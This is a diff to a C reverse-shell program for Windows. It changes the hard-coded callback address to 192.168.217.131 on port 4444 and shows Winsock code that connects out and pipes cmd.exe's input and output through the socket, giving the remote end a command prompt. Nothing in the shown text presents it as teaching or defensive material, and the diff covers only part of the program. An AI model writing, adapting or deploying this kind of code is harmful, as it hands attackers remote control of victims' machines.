@@ -13,8 +13,8 @@ int main()
     PROCESS_INFORMATION pi;
     char RecvServer[512];
     int connection;
-    char ip_addr[] = "192.168.29.108";
-    int port = 8081;
+    char ip_addr[] = "192.168.217.131";
+    int port = 4444;
     
     WSAStartup(MAKEWORD(2,2), &wsa); //initialize winsock
     shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
@@ -37,7 +37,7 @@ int main()
         si.cb = sizeof(si);
         si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
         si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; //pipe std input/output/error to our socket
-        CreateProcess(NULL,"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi ); //spawn command prompt
+        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi ); //spawn command prompt
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
